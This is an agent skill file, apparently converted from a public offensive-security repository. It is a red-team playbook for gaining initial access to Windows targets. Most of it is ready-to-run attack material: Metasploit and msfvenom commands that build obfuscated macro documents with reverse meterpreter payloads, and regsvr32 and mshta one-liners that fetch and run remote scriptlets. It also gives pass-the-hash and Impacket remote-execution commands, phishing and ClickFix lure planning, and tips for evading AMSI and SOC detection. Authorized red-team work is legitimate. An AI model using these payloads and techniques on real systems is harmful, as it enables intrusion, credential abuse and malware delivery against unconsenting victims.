---
name: redteam-initial-access
description: >-
  Gain initial access during red team operations: phishing, ClickFix, HTML smuggling, malicious
  Office documents (Excel, Word, VSTO), Windows download-and-execute one-liners, using credentials
  on Windows hosts, and web attack-surface mapping. Use when planning an initial foothold, when
  crafting a payload or phishing lure, when you hold credentials for a Windows host, or when
  choosing an execution technique that survives mail and proxy filters.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "10"
  generated-by: build/build.py
---

# Initial Access

Foothold work is a packaging problem before it is a payload problem: every chain is
`DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))` — an email or link delivers a container (ISO, ZIP,
HTML page), the container carries a trigger (LNK, CHM, macro, ClickOnce) that runs the payload, and
a decoy keeps the pretext alive after detonation. Done means an interactive session or a validated
credential set on a host inside scope, with the delivery path repeatable for the next target.

## When to use this skill

- You are planning the first foothold and must choose a lure and payload that survive the target's
  mail gateway, proxy and macro policy.
- You already know the payload family (Office macro, HTML smuggling, ClickFix, LOLBin one-liner) and
  need the exact generator command and flags.
- You hold Windows credentials — password, NT hash, Kerberos ticket — and need the remote execution
  channel that matches the open ports and rights you have.
- You are mapping the external web surface (subdomains, technology stack, dangling DNS) to pick an
  entry point.
- Use `c2-frameworks` for the listener that catches the callback, `redteam-defense-evasion` when the
  payload is blocked or AMSI fires, and `redteam-privilege-escalation` once you land.

## First moves

1. **Generate the macro document and its handler in one Metasploit pass.** `PrependMigrate` moves
   the session off the Office process before the user closes the document:

   ```bash
   use exploit/multi/fileformat/office_word_macro
   set payload windows/meterpreter/reverse_http
   set LHOST 10.10.10.10
   set LPORT 80
   set DisablePayloadHandler True
   set PrependMigrate True
   set FILENAME Financial2021.docm
   exploit -j
   ```

2. **Re-template and obfuscate the macro instead of shipping raw `msfvenom` VBA.** `-o` strips
   spaces and obfuscates strings, functions and variable names:

   ```powershell
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba
   echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm
   ```

3. **Execute from a Microsoft-signed LOLBin when only HTTP egress exists.** `scrobj.dll` makes
   `regsvr32` fetch and run a scriptlet; `mshta` does the same for a `.sct` or `.hta`:

   ```powershell
   regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
   mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
   ```

4. **Validate credentials before building a payload around them.** One NT hash is reusable across
   SMB, WinRM, RDP and LDAP; the response tells you whether the account is local, domain, or
   restricted:

   ```bash
   netexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
   netexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
   ```

5. **Pick the Impacket exec by port and privilege, not by habit.** `wmiexec` needs admin plus
   tcp/135 and a dynamic Winmgmt port; `atexec`, `smbexec` and `dcomexec` do not need admin but each
   leaves a different service or task artefact:

   ```bash
   wmiexec.py DOMAIN/username:password@10.10.10.10
   psexec.py DOMAIN/username:password@10.10.10.10 -service-name customservicename -remote-binary-name custombin.exe
   ```

6. **Map the external surface that decides which lure is plausible** — a live login portal enables
   credential phishing or an AiTM proxy, a dangling CNAME enables subdomain takeover:

   ```bash
   subfinder -d example.com
   httpx -u 'https://example.com' -title -tech-detect -status-code -follow-redirects
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [initial-access.md](references/initial-access.md) | you are choosing the overall delivery package | DELIVERY/CONTAINER/TRIGGER/PAYLOAD/DECOY model, ISO/ZIP/WIM automount, .exe/.dll/.cpl payloads, signing with leaked certs |
| [phishing.md](references/phishing.md) | the lure is a link or an email campaign | GoPhish build and IOC scrubbing, Evilginx phishlets, GitHub device-code phishing, phishing OPSEC fails |
| [clickfix.md](references/clickfix.md) | you want the user to paste the command themselves | FileFix Run-dialog and Explorer address-bar lure, clipboard payload padding, MOTW stripping on Explorer execution |
| [html-smuggling.md](references/html-smuggling.md) | the payload must be assembled in the browser | Blob + `createObjectURL` download page, base64-to-ArrayBuffer loader |
| [office-excel.md](references/office-excel.md) | the target opens spreadsheets, or VBA is blocked | XLSM/Hot Manchego, XLM via Macrome/SharpShooter/EXCELntDonut, `=EXEC` and SLK one-liners, XLL add-ins, `VelvetSweatshop` |
| [office-word.md](references/office-word.md) | the target opens documents and macros are allowed | DOCM recipes (Metasploit, download-exec, WMI, scheduled task), VBA obfuscation, VBA stomping with OfficePurge/EvilClippy, template injection, DDE |
| [office-macro-development.md](references/office-macro-development.md) | you must write or modify the VBA yourself | `Private Declare PtrSafe` WinAPI imports, `VirtualAlloc`/`RtlMoveMemory`/`CreateThread` shellcode runner, VSTO add-ins |
| [windows-download-execute.md](references/windows-download-execute.md) | you have only a command line to work with | PowerShell IEX variants, `mshta`, `rundll32`, `regsvr32`, `regasm`, `odbcconf`, `msbuild`, `certutil`, `bitsadmin` one-liners |
| [windows-using-credentials.md](references/windows-using-credentials.md) | you hold a password, hash or ticket for a Windows host | netexec protocols, Impacket exec port/privilege matrix, RDP/NLA and pass-the-hash, PSRemoting, WinRM/evil-winrm, WMI, SSH |
| [web-attack-surface.md](references/web-attack-surface.md) | the entry point is a public web asset | subdomain databases and brute force, dnsx/massdns resolution, `httpx` tech detection, subdomain takeover checks |

## Workflow

1. **Fix the constraint first, then choose the package.** Attachment filtering blocks executables
   and macro documents → deliver a link (HTML smuggling, ClickFix, Evilginx). Macro execution blocked
   by MOTW or ASR → move to a container (ISO/IMG) with LNK/CHM, or a non-VBA format. Binary execution
   blocked by AppLocker/WDAC → `redteam-defense-evasion`.
2. **Office branch, by what the renderer actually supports.** XLM (Excel 4.0) predates VBA and has no
   AMSI visibility — prefer it over DOCM when Defender is current. A VBA DOCM needs "Enable Content"
   and is scanned at runtime. XLL is blocked by default in current Excel. VBA stomping hides the
   source from static AV, but the p-code is still scanned by AMSI.
3. **Execution branch.** With only a command line, take the LOLBin from
   `windows-download-execute.md` that matches what is installed and what the proxy allows; prefer a
   binary already used in the environment over `certutil`.
4. **Credential branch.** netexec to validate and loot (SAM/LSA/DPAPI/`--ntds`) → Impacket or WinRM
   to execute → RDP only when NLA is off or Restricted Admin is available. Do not build a phishing
   lure for a target you can already log on to.
5. **Web branch.** Only if the foothold must come from the internet: enumerate subdomains, detect
   technology, check takeover candidates, then hand the result to `phishing.md` for the lure.
6. **Hand off.** Callback handling and profiles are `c2-frameworks`; once the shell is stable, go to
   `redteam-privilege-escalation`, then `redteam-persistence`.

## Gotchas

- XLM shellcode cannot contain null bytes — every Macrome/SharpShooter recipe encodes with
  `-b '\x00'` first. A payload with nulls produces a document that simply does not run.
- VBA stomping does not work on Excel 97-2003 `.xls`, and AMSI still catches stomped VBA: the
  EvilClippy/OfficePurge trick defeats static analysis, not runtime scanning.
- `VelvetSweatshop` as the Macrome `--password` makes Excel decrypt the document with no user
  prompt; that password can only be set in Excel 2003.
- Excel blocks untrusted XLL add-ins by default, and the `office_word_macro` download-and-exec
  sample is detected by Defender through AMSI — expect to change the execution primitive, not just
  the strings.
- Mark-of-the-Web decides many triggers: `RemoteSigned` blocks downloaded scripts until
  `Unblock-File`, while executing an `.exe` from the Explorer address bar (FileFix) strips MOTW.
- Impacket on Kali: scripts are renamed `impacket-xxxxx`, `get`/`put` are becoming `lget`/`lput`, and
  non-ASCII output needs `-codec ibm850`.
- Non-RID-500 local admins are filtered by UAC: `wmiexec`/`psexec` fail until
  `LocalAccountTokenFilterPolicy=1` is set on the target.
- `wmiexec` runs `cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1` by default — use a
  non-default `-share` to break that correlation rule. `smbexec` creates service `BTOBTO` and logs
  Event 7045 on every command.
- RDP needs `fDenyTSConnections=0`; pass-the-hash over RDP requires Restricted Admin and works only
  on Server 2012 R2 / Windows 8.1 and later. SSH cannot consume an NT hash.
- `mshta`/`regsvr32`/`rundll32` one-liners are parent-child anomalies (Office or Explorer spawning a
  script host) — the technique works, but it is the first thing a mature SOC alerts on.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Payloads and
lures must stay inside the agreed target list; never detonate against third parties.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
